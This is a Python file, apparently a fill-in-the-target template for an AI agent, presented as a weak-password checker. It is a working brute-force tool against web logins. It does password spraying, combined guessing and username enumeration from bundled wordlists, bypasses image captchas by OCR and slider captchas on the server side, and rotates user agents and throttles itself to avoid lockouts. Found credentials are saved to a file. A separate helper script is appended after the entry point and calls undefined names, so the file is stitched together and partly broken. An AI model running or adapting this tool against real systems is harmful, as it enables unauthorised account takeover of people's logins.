#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
弱口令检测通用框架 (Weak Password Check Framework)
====================================================
Agent 生成新目标脚本时，复制此文件并填写 [CONFIG] 区域即可。

包含模块:
  - [CONFIG]  目标配置区 (唯一需要修改的部分)
  - [CRYPTO]  加密方法: RSA / AES-CBC / AES-ECB / SM4 / MD5 / SHA / Base64 / Hex
  - [CAPTCHA] 验证码: 图形OCR(ddddocr) / 滑块服务端绕过
  - [HTTP]    HTTP工具: 线程本地Session / UA轮换 / 重试装饰器 / SSL禁用
  - [PAYLOAD] 载荷构造: 喷洒模式 / 组合模式 / 枚举模式
  - [ENGINE]  执行引擎: 自适应并发 / 进度条 / 结果保存
  - [MAIN]    入口: argparse / 日志 / 字典加载

用法:
  python brute_force.py --test                    # 测试模式 (单线程,少量)
  python brute_force.py --threads 10              # 全量爆破
  python brute_force.py --users u.txt --pwds p.txt --threads 5
"""

import os
import sys
import time
import json
import random
import logging
import hashlib
import base64
import argparse
import threading
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from tqdm import tqdm
    TUI_AVAILABLE = True
except ImportError:
    TUI_AVAILABLE = False

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5, AES
    from Crypto.Util.Padding import pad
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import ddddocr
    OCR_AVAILABLE = True
except ImportError:
    OCR_AVAILABLE = False

try:
    from gmssl.sm4 import CryptSM4, SM4_ENCRYPT
    SM4_AVAILABLE = True
except ImportError:
    SM4_AVAILABLE = False


# ══════════════════════════════════════════════════════════════════════════════
# [CONFIG] 目标配置区 —— Agent 填写这里，其余代码不用动
# ══════════════════════════════════════════════════════════════════════════════

BASE_URL        = "https://target.example.com"          # 目标站点根 URL
LOGIN_URL       = f"{BASE_URL}/login"                   # 登录接口 URL
METHOD          = "POST"                                # POST / GET

# 请求头 (从浏览器 Network 面板复制, 去掉 Cookie/Content-Length)
HEADERS = {
    "Accept":           "application/json, text/plain, */*",
    "Accept-Language":  "zh-CN,zh;q=0.9",
    "Content-Type":     "application/x-www-form-urlencoded",
    "Referer":          f"{BASE_URL}/login.html",
}

# 表单字段名 (侦察阶段确定)
FIELD_USERNAME  = "username"                            # 用户名字段名
FIELD_PASSWORD  = "password"                            # 密码字段名
FIELD_CAPTCHA   = "captcha"                             # 验证码字段名 (无则留空)

# 加密方式 (从下方 [CRYPTO] 选一个函数名, 无加密填 None)
ENCRYPT_USERNAME = None                                 # 例: rsa_encrypt / None
ENCRYPT_PASSWORD = None                                 # 例: rsa_encrypt / aes_cbc_encrypt

# 验证码
CAPTCHA_URL     = ""                                    # 图形验证码 URL (无则留空)
SLIDER_URL      = ""                                    # 滑块验证码 API URL (无则留空)

# 响应判断
SUCCESS_INDICATOR   = "ok"                              # 成功标志 (出现在响应体中)
FAILURE_INDICATOR   = ""                                # 失败标志 (可选, 用于区分用户不存在)
RETRY_INDICATOR     = "验证码"                          # 需要重试的标志 (如验证码错误)

# 并发与速率
DEFAULT_THREADS = 10                                    # 默认并发线程数
SPRAY_DELAY     = 0.1                                   # 每次请求后延迟(秒)
MAX_RETRIES     = 3                                     # 单次请求最大重试次数

# RSA 公钥 (Base64 DER 格式, 如无 RSA 可留空)
RSA_PUBLIC_KEY_B64 = ""

# AES 配置 (如无 AES 可留空)
AES_KEY_HEX     = ""                                    # 32字节hex → AES-256
AES_IV_HEX      = ""                                    # 16字节hex → CBC IV
AES_MODE        = "CBC"                                 # CBC / ECB

# SM4 配置 (如无 SM4 可留空)
SM4_KEY_HEX     = ""                                    # 16字节hex

# 输出目录 (通常为脚本所在目录)
OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))

# 字典路径 (相对于技能根目录的 assets/wordlists)
_SKILL_ROOT  = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_WL_BASE     = os.path.join(_SKILL_ROOT, "assets", "wordlists")
DEFAULT_USERS_FILE = os.path.join(_WL_BASE, "usernames", "TOP241用户名.txt")
DEFAULT_PWDS_FILE  = os.path.join(_WL_BASE, "passwords", "TOP603密码.txt")

USER_AGENTS = [
    # ── Windows Chrome ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    # ── Windows Firefox ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    # ── Windows Edge ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    # ── macOS Chrome ──
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # ── macOS Safari ──
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    # ── macOS Firefox ──
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    # ── Linux Chrome ──
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # ── Linux Firefox ──
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    # ── Android Chrome (移动端) ──
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
    # ── iOS Safari (移动端) ──
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

# UA 自动轮换频率: 每 N 次请求随机换一次 UA (0 = 不自动轮换)
UA_ROTATE_EVERY = 5


# ══════════════════════════════════════════════════════════════════════════════
# [CRYPTO] 加密工具箱 —— 按需调用，不用的不影响运行
# ══════════════════════════════════════════════════════════════════════════════

# ── RSA PKCS1v15 (jsencrypt 最常见) ──────────────────────────────────────────
_rsa_key_cache = None

def rsa_encrypt(plaintext: str) -> str:
    """RSA PKCS1v15 加密，返回 Base64 字符串。需设置 RSA_PUBLIC_KEY_B64。"""
    global _rsa_key_cache
    if not CRYPTO_AVAILABLE:
        raise RuntimeError("pycryptodome 未安装: pip install pycryptodome")
    if _rsa_key_cache is None:
        _rsa_key_cache = RSA.import_key(base64.b64decode(RSA_PUBLIC_KEY_B64))
    cipher = PKCS1_v1_5.new(_rsa_key_cache)
    return base64.b64encode(cipher.encrypt(plaintext.encode("utf-8"))).decode()


# ── AES-CBC (crypto-js 默认) ──────────────────────────────────────────────────
def aes_cbc_encrypt(plaintext: str) -> str:
    """AES-CBC-PKCS7 加密，返回 Base64 字符串。需设置 AES_KEY_HEX / AES_IV_HEX。"""
    if not CRYPTO_AVAILABLE:
        raise RuntimeError("pycryptodome 未安装")
    key = bytes.fromhex(AES_KEY_HEX)
    iv  = bytes.fromhex(AES_IV_HEX)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode(), AES.block_size))).decode()


# ── AES-ECB ───────────────────────────────────────────────────────────────────
def aes_ecb_encrypt(plaintext: str) -> str:
    """AES-ECB-PKCS7 加密，返回 Base64 字符串。需设置 AES_KEY_HEX。"""
    if not CRYPTO_AVAILABLE:
        raise RuntimeError("pycryptodome 未安装")
    key = bytes.fromhex(AES_KEY_HEX)
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode(), AES.block_size))).decode()


# ── SM4 (国密, gmssl) ─────────────────────────────────────────────────────────
def sm4_encrypt(plaintext: str) -> str:
    """SM4-CBC 加密，返回 Hex 字符串。需设置 SM4_KEY_HEX。"""
    if not SM4_AVAILABLE:
        raise RuntimeError("gmssl 未安装: pip install gmssl")
    sm4 = CryptSM4()
    sm4.set_key(bytes.fromhex(SM4_KEY_HEX), SM4_ENCRYPT)
    iv = bytes.fromhex(AES_IV_HEX) if AES_IV_HEX else bytes(16)
    result = sm4.crypt_cbc(iv, plaintext.encode("utf-8"))
    return result.hex()


# ── 哈希 ──────────────────────────────────────────────────────────────────────
def md5(text: str) -> str:
    """MD5 十六进制摘要 (小写)。"""
    return hashlib.md5(text.encode("utf-8")).hexdigest()

def sha1(text: str) -> str:
    return hashlib.sha1(text.encode("utf-8")).hexdigest()

def sha256(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


# ── Base64 / Hex ──────────────────────────────────────────────────────────────
def b64_encode(text: str) -> str:
    return base64.b64encode(text.encode("utf-8")).decode()

def hex_encode(text: str) -> str:
    return text.encode("utf-8").hex()


# ══════════════════════════════════════════════════════════════════════════════
# [CAPTCHA] 验证码处理
# ══════════════════════════════════════════════════════════════════════════════

_ocr_instance = None

def get_ocr():
    """单例 ddddocr 实例，避免重复初始化耗时。"""
    global _ocr_instance
    if OCR_AVAILABLE and _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


def solve_image_captcha(session: requests.Session) -> str:
    """
    图形验证码 OCR。
    需设置 CAPTCHA_URL。返回识别字符串，失败返回空串。
    """
    if not CAPTCHA_URL:
        return ""
    ocr = get_ocr()
    if not ocr:
        logging.warning("ddddocr 未安装，无法识别验证码")
        return ""
    try:
        resp = session.get(CAPTCHA_URL, timeout=10)
        if resp.status_code == 200:
            code = ocr.classification(resp.content)
            logging.debug(f"验证码识别: {code}")
            return code
    except Exception as e:
        logging.debug(f"验证码获取失败: {e}")
    return ""


def get_slider_code(session: requests.Session) -> str:
    """
    滑块验证码服务端绕过。
    直接请求 SLIDER_URL，从 JSON 响应中提取 sliderCheckCode。
    适用于服务端直接返回校验码、客户端做校验的场景。
    需设置 SLIDER_URL。
    """
    if not SLIDER_URL:
        return ""
    try:
        resp = session.get(SLIDER_URL, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            # 常见字段名: sliderCheckCode / checkCode / token / verify_code
            for key in ("sliderCheckCode", "checkCode", "token", "verify_code", "code"):
                if key in data:
                    return str(data[key])
    except Exception as e:
        logging.debug(f"滑块验证码获取失败: {e}")
    return ""


# ══════════════════════════════════════════════════════════════════════════════
# [HTTP] HTTP 工具
# ══════════════════════════════════════════════════════════════════════════════

_thread_local = threading.local()


def get_session() -> requests.Session:
    """
    线程本地 Session，每个线程复用同一个 Session 以保持 Cookie。
    首次调用时自动访问登录页以初始化 Cookie。
    """
    if not hasattr(_thread_local, "session"):
        s = requests.Session()
        s.verify = False
        s.headers.update({**HEADERS, "User-Agent": random.choice(USER_AGENTS)})
        try:
            s.get(BASE_URL, timeout=10)           # 初始化 Cookie / CSRF token
        except Exception:
            pass
        _thread_local.session = s
    return _thread_local.session


def refresh_session():
    """强制重建当前线程的 Session（如遇 IP 封禁后切换代理时使用）。"""
    if hasattr(_thread_local, "session"):
        _thread_local.session.close()
        del _thread_local.session


def rotate_ua():
    """为当前线程 Session 随机更换 User-Agent。"""
    s = get_session()
    s.headers["User-Agent"] = random.choice(USER_AGENTS)


def build_payload(username: str, password: str, extra: dict = None) -> dict:
    """
    构造登录请求载荷。
    按 ENCRYPT_USERNAME / ENCRYPT_PASSWORD 配置自动加密。
    extra: 附加字段 (如 captcha、csrf_token 等)。
    """
    u = ENCRYPT_USERNAME(username) if ENCRYPT_USERNAME else username
    p = ENCRYPT_PASSWORD(password) if ENCRYPT_PASSWORD else password
    payload = {FIELD_USERNAME: u, FIELD_PASSWORD: p}
    if extra:
        payload.update(extra)
    return payload


def do_request(session: requests.Session, payload: dict) -> requests.Response | None:
    """
    执行登录请求，含验证码注入和指数退避重试。
    返回 Response 对象，失败返回 None。
    """
    for attempt in range(MAX_RETRIES):
        try:
            # ── 注入验证码 ──
            if CAPTCHA_URL:
                payload[FIELD_CAPTCHA] = solve_image_captcha(session)
            elif SLIDER_URL:
                payload[FIELD_CAPTCHA] = get_slider_code(session)

            # ── 发送请求 ──
            if METHOD.upper() == "POST":
                resp = session.post(LOGIN_URL, data=payload, timeout=15)
            else:
                resp = session.get(LOGIN_URL, params=payload, timeout=15)

            # ── 服务端限流: 退避重试 ──
            if resp.status_code in (429, 503, 502):
                wait = 2 ** (attempt + 1)
                logging.warning(f"HTTP {resp.status_code}，等待 {wait}s 后重试")
                time.sleep(wait)
                continue

            # ── 逻辑重试 (验证码错误等) ──
            if RETRY_INDICATOR and RETRY_INDICATOR in resp.text:
                logging.debug(f"触发重试标志，重试 ({attempt+1}/{MAX_RETRIES})")
                time.sleep(1)
                continue

            return resp

        except requests.exceptions.RequestException as e:
            logging.debug(f"请求异常: {e}")
            time.sleep(1)

    return None


def is_success(resp: requests.Response) -> bool:
    """判断登录是否成功。"""
    return SUCCESS_INDICATOR in resp.text


def is_user_exists(resp: requests.Response) -> bool:
    """
    判断用户名是否存在 (用于枚举)。
    如果 FAILURE_INDICATOR 为空 (不可枚举)，始终返回 True。
    """
    if not FAILURE_INDICATOR:
        return True
    return FAILURE_INDICATOR not in resp.text


# ══════════════════════════════════════════════════════════════════════════════
# [PAYLOAD] 载荷生成策略
# ══════════════════════════════════════════════════════════════════════════════

def gen_spray_rounds(usernames: list, passwords: list):
    """
    密码喷洒: 每轮固定一个密码，遍历全部用户名。
    适用于有账号锁定策略的目标 (避免单账号连续失败)。
    生成器，yields (username, password)。
    """
    for password in passwords:
        for username in usernames:
            yield username, password


def gen_combined(usernames: list, passwords: list):
    """
    组合爆破: 每个用户名遍历全部密码。
    适用于无锁定策略、可枚举用户名的目标。
    生成器，yields (username, password)。
    """
    for username in usernames:
        for password in passwords:
            yield username, password


def gen_enumerate_users(usernames: list, probe_password: str = "Password123"):
    """
    用户名枚举: 用固定密码逐一探测用户名是否存在。
    适用于不同用户返回不同错误信息的目标。
    生成器，yields (username, probe_password)。
    """
    for username in usernames:
        yield username, probe_password


# ══════════════════════════════════════════════════════════════════════════════
# [ENGINE] 执行引擎
# ══════════════════════════════════════════════════════════════════════════════

class BruteForcer:
    def __init__(self, threads: int = DEFAULT_THREADS, test_mode: bool = False):
        self.threads     = 1 if test_mode else threads
        self.test_mode   = test_mode
        self.found       = []
        self.valid_users = []
        self._lock       = Lock()
        self._total      = 0
        self._start_time = None
        self._req_count  = 0          # 全局请求计数 (用于 UA 轮换)
        self._req_lock   = Lock()

        # 自适应并发
        self._active_threads  = self.threads
        self._errors_window   = 0
        self._last_tune       = time.time()
        self._response_times  = []

        # 输出文件
        self.results_file    = os.path.join(OUTPUT_DIR, "results.txt")
        self.enum_file       = os.path.join(OUTPUT_DIR, "valid_users.txt")

        # 用户失败计数 (滑块触发判断)
        self._fail_count  = {}
        self._fail_lock   = Lock()

    # ── 自适应并发调节 ────────────────────────────────────────────────────────
    def _record_metric(self, duration: float, status_code: int):
        self._response_times.append(duration)
        if len(self._response_times) > 100:
            self._response_times.pop(0)
        if status_code in (429, 503, 502):
            self._errors_window += 1

    def _auto_tune(self):
        if time.time() - self._last_tune < 30:
            return
        avg = sum(self._response_times) / max(len(self._response_times), 1)
        if self._errors_window > 5 or avg > 2.0:
            self._active_threads = max(1, int(self._active_threads * 0.7))
            logging.info(f"[调优] 降低并发 → {self._active_threads} (错误:{self._errors_window}, 延迟:{avg:.2f}s)")
        elif self._errors_window == 0 and avg < 0.5:
            self._active_threads = min(self.threads * 2, self._active_threads + 2)
            logging.info(f"[调优] 提升并发 → {self._active_threads}")
        self._errors_window = 0
        self._last_tune = time.time()

    # ── 单次尝试 ──────────────────────────────────────────────────────────────
    def _attempt(self, username: str, password: str, pbar=None) -> bool:
        session = get_session()

        # UA 自动轮换
        if UA_ROTATE_EVERY > 0:
            with self._req_lock:
                self._req_count += 1
                should_rotate = (self._req_count % UA_ROTATE_EVERY == 0)
            if should_rotate:
                rotate_ua()
                logging.debug(f"UA 已轮换: {session.headers.get('User-Agent', '')[:60]}")

        # 判断该用户是否需要验证码 (失败次数达到阈值)
        with self._fail_lock:
            fail_cnt = self._fail_count.get(username, 0)

        extra = {}
        if SLIDER_URL and fail_cnt >= 2:
            extra[FIELD_CAPTCHA] = get_slider_code(session)
        elif CAPTCHA_URL:
            extra[FIELD_CAPTCHA] = solve_image_captcha(session)

        payload = build_payload(username, password, extra)
        t0 = time.time()
        resp = do_request(session, payload)
        duration = time.time() - t0

        if resp is None:
            if pbar:
                pbar.update(1)
            time.sleep(SPRAY_DELAY)
            return False

        self._record_metric(duration, resp.status_code)

        success = is_success(resp)

        if success:
            msg = f"[+] 成功! {username}:{password}"
            logging.info(msg)
            if TUI_AVAILABLE and pbar:
                tqdm.write(msg)
            else:
                print(msg)
            with self._lock:
                self.found.append((username, password))
                with open(self.results_file, "a", encoding="utf-8") as f:
                    f.write(f"{username}:{password}\n")
        else:
            logging.debug(f"[-] 失败 {username}:{password} → {resp.text[:80]}")
            with self._fail_lock:
                self._fail_count[username] = self._fail_count.get(username, 0) + 1

            # 用户名枚举记录
            if FAILURE_INDICATOR and is_user_exists(resp):
                with self._lock:
                    if username not in self.valid_users:
                        self.valid_users.append(username)
                        with open(self.enum_file, "a", encoding="utf-8") as f:
                            f.write(f"{username}\n")

        with self._lock:
            self._total += 1

        if pbar:
            pbar.update(1)

        time.sleep(SPRAY_DELAY)
        return success

    # ── 测试模式 ──────────────────────────────────────────────────────────────
    def run_test(self, usernames: list, passwords: list):
        print("=" * 55)
        print("  测试模式 (单线程, 前3用户名 × 前2密码)")
        print("=" * 55)

        # 验证加密
        if ENCRYPT_PASSWORD:
            try:
                enc = ENCRYPT_PASSWORD("test123")
                print(f"[*] 加密测试: test123 → {enc[:40]}...")
            except Exception as e:
                print(f"[!] 加密失败: {e}")
                return False

        # 验证验证码
        session = get_session()
        if SLIDER_URL:
            code = get_slider_code(session)
            print(f"[*] 滑块验证码: {code[:30] if code else '未获取到 (可能首次不需要)'}")
        elif CAPTCHA_URL:
            code = solve_image_captcha(session)
            print(f"[*] 图形验证码识别: {code if code else '失败'}")

        # 实际请求测试
        print()
        for u in usernames[:3]:
            for p in passwords[:2]:
                payload = build_payload(u, p)
                resp = do_request(session, payload)
                if resp:
                    status = "成功" if is_success(resp) else "失败"
                    print(f"  {u}:{p} → {status} ({resp.text[:60].strip()})")
                else:
                    print(f"  {u}:{p} → 请求失败")
                time.sleep(0.5)

        print("\n测试完成。请检查结果后决定是否继续全量爆破。")
        return True

    # ── 全量执行 ──────────────────────────────────────────────────────────────
    def run(self, pairs, total_count: int):
        """
        通用执行方法。pairs 为任意生成器，yields (username, password)。
        total_count 为总组合数 (用于进度条)。
        """
        print("=" * 55)
        print(f"  开始爆破: {total_count:,} 组合 | {self.threads} 线程")
        print("=" * 55)

        self._start_time = time.time()
        pbar = tqdm(total=total_count, unit="req", desc="进度") if TUI_AVAILABLE else None

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {
                    executor.submit(self._attempt, u, p, pbar): (u, p)
                    for u, p in pairs
                }
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        logging.error(f"线程异常: {e}")
                    self._auto_tune()

        except KeyboardInterrupt:
            print("\n\n用户中断。")
        finally:
            if pbar:
                pbar.close()

        self._report()

    def _report(self):
        elapsed = time.time() - self._start_time
        rate = self._total / max(elapsed, 1)
        print("\n" + "=" * 55)
        print(f"  完成 | 总尝试: {self._total:,} | 耗时: {elapsed:.1f}s | {rate:.1f} req/s")
        if self.found:
            print(f"\n  发现凭据 ({len(self.found)} 个):")
            for u, p in self.found:
                print(f"    {u}:{p}")
            print(f"\n  已保存至: {self.results_file}")
        else:
            print("  未发现有效凭据。")
        if self.valid_users:
            print(f"\n  枚举到有效用户 ({len(self.valid_users)} 个)，已保存至: {self.enum_file}")
        print("=" * 55)


# ══════════════════════════════════════════════════════════════════════════════
# [MAIN] 入口
# ══════════════════════════════════════════════════════════════════════════════

def load_wordlist(filepath: str) -> list:
    """加载字典文件，忽略空行和 # 注释行。"""
    if not os.path.exists(filepath):
        sys.exit(f"[!] 字典文件不存在: {filepath}")
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


def setup_logging(debug: bool = False):
    log_file = os.path.join(OUTPUT_DIR, "brute.log")
    logging.basicConfig(
        level=logging.DEBUG if debug else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[
            logging.FileHandler(log_file, encoding="utf-8"),
        ],
    )


def main():
    global SPRAY_DELAY
    parser = argparse.ArgumentParser(
        description="弱口令检测通用框架",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--test",    action="store_true",          help="测试模式 (单线程, 少量请求)")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help=f"并发线程数 (默认: {DEFAULT_THREADS})")
    parser.add_argument("--users",   type=str, default=DEFAULT_USERS_FILE, help="用户名字典路径")
    parser.add_argument("--pwds",    type=str, default=DEFAULT_PWDS_FILE,  help="密码字典路径")
    parser.add_argument("--delay",   type=float, default=SPRAY_DELAY,      help=f"请求间隔秒数 (默认: {SPRAY_DELAY})")
    parser.add_argument("--spray",   action="store_true",          help="密码喷洒模式 (默认: 组合模式)")
    parser.add_argument("--enum",    action="store_true",          help="仅枚举用户名")
    args = parser.parse_args()

    SPRAY_DELAY = args.delay

    setup_logging(debug=args.test)

    usernames = load_wordlist(args.users)
    passwords  = load_wordlist(args.pwds)

    print(f"用户名: {len(usernames):,} 条 | 密码: {len(passwords):,} 条")
    print(f"目标:   {LOGIN_URL}")

    forcer = BruteForcer(threads=args.threads, test_mode=args.test)

    if args.test:
        forcer.run_test(usernames, passwords)
    elif args.enum:
        pairs = list(gen_enumerate_users(usernames))
        forcer.run(iter(pairs), len(pairs))
    elif args.spray:
        pairs = list(gen_spray_rounds(usernames, passwords))
        forcer.run(iter(pairs), len(pairs))
    else:
        pairs = list(gen_combined(usernames, passwords))
        forcer.run(iter(pairs), len(pairs))


if __name__ == "__main__":
    main()

def red(s):    return f"\033[31m{s}\033[0m"
def yellow(s): return f"\033[33m{s}\033[0m"
def bold(s):   return f"\033[1m{s}\033[0m"
def cyan(s):   return f"\033[36m{s}\033[0m"


# ─── 1. 环境检查 ──────────────────────────────────────────────────────────────
REQUIRED_PACKAGES = {
    "requests":      "HTTP 请求库 (核心依赖)",
    "tqdm":          "进度条显示",
    "Crypto":        "pycryptodome — RSA/AES 加密 (pip install pycryptodome)",
}

OPTIONAL_PACKAGES = {
    "ddddocr":       "图形验证码 OCR (pip install ddddocr)",
    "gmssl":         "国密 SM2/SM4 加密 (pip install gmssl)",
    "urllib3":       "HTTP 工具 (随 requests 安装)",
}

def check_environment():
    print(bold("\n[1] 环境检查"))
    print("─" * 50)

    all_ok = True
    for pkg, desc in REQUIRED_PACKAGES.items():
        try:
            __import__(pkg)
            print(f"  {green('✓')} {pkg:<15} {desc}")
        except ImportError:
            print(f"  {red('✗')} {pkg:<15} {red('未安装')} — {desc}")
            all_ok = False

    print()
    for pkg, desc in OPTIONAL_PACKAGES.items():
        try:
            __import__(pkg)
            print(f"  {green('○')} {pkg:<15} {desc}")
        except ImportError:
            print(f"  {yellow('○')} {pkg:<15} {yellow('未安装 (可选)')} — {desc}")

    print()
    if all_ok:
        print(f"  {green('所有必需依赖已就绪。')}")
    else:
        print(f"  {red('部分必需依赖缺失，请运行:')}")
        print(f"  {yellow('  pip install requests tqdm pycryptodome')}")

    return all_ok


# ─── 2. 字典统计 ──────────────────────────────────────────────────────────────
WORDLIST_FILES = {
    "usernames": [
        ("TOP241用户名.txt",    "快速首波攻击用户名"),
        ("web管理用户字典.txt", "Web 管理账号字典"),
        ("16817条全部.txt",     "全量用户名枚举"),
        ("特殊手机号.txt",      "手机号登录目标"),
    ],
    "passwords": [
        ("TOP603密码.txt",              "快速首波攻击密码"),
        ("CN本土化password-2010条.txt", "中国本土化密码"),
        ("burp密码-3424条.txt",         "国际通用密码 (Burp Suite)"),
    ],
}

def count_lines(filepath):
    """统计文件中非空行数"""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for line in f if line.strip())
    except FileNotFoundError:
        return -1

def show_wordlists():
    print(bold("\n[2] 字典统计"))
    print("─" * 50)

    total_users = 0
    total_pwds = 0

    for category, files in WORDLIST_FILES.items():
        label = "用户名字典" if category == "usernames" else "密码字典"
        print(f"\n  {cyan(label)} ({category}/)")
        for filename, desc in files:
            filepath = os.path.join(WORDLISTS_DIR, category, filename)
            count = count_lines(filepath)
            if count >= 0:
                bar = "█" * min(count // 200, 30)
                print(f"    {green('✓')} {filename:<35} {count:>6} 条  {yellow(bar)}  {desc}")
                if category == "usernames":
                    total_users = max(total_users, count)
                else:
                    total_pwds = max(total_pwds, count)
            else:
                print(f"    {red('✗')} {filename:<35} {red('文件不存在')}")

    print(f"\n  最大组合数 (全量): {total_users:,} 用户名 × {total_pwds:,} 密码 = {total_users * total_pwds:,} 次尝试")
    print(f"  快速首波组合数:    241 用户名 × 603 密码 = {241 * 603:,} 次尝试")


# ─── 3. 加密演示 ──────────────────────────────────────────────────────────────

# 示例 RSA 公钥
DEMO_RSA_PUBKEY_B64 = (
    "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQClF+ln/GyGcCY9FVpm5SvFfQvP"
    "ZAUipiF6hsqXYmG/DqW2LnLqEXZpP8rwKO3jROHsNVkqDOqfZSAki2l75oMRxeiA"
    "QXr4AWJYHHIq0AjayZOoBqpmERqTwLWbWVZwrDt/H17oAi6SQfO1yn2WqVZMMVHo"
    "iib8E5f85qQTsZr4AwIDAQAB"
)

def demo_rsa_encrypt(plaintext="admin"):
    """演示 RSA PKCS1v15 加密 (最常见的登录表单加密方式)"""
    import base64
    try:
        from Crypto.PublicKey import RSA
        from Crypto.Cipher import PKCS1_v1_5

        pubkey_der = base64.b64decode(DEMO_RSA_PUBKEY_B64)
        key = RSA.import_key(pubkey_der)
        cipher = PKCS1_v1_5.new(key)
        encrypted = cipher.encrypt(plaintext.encode("utf-8"))
        result = base64.b64encode(encrypted).decode("utf-8")

        print(f"    明文: {green(repr(plaintext))}")
        print(f"    密文: {yellow(result[:60])}...")
        print(f"    长度: {len(result)} 字符 (RSA-1024 → Base64 固定 172 字符)")
        return True
    except ImportError:
        print(f"    {red('pycryptodome 未安装，跳过 RSA 演示')}")
        return False
    except Exception as e:
        print(f"    {red(f'RSA 加密失败: {e}')}")
        return False


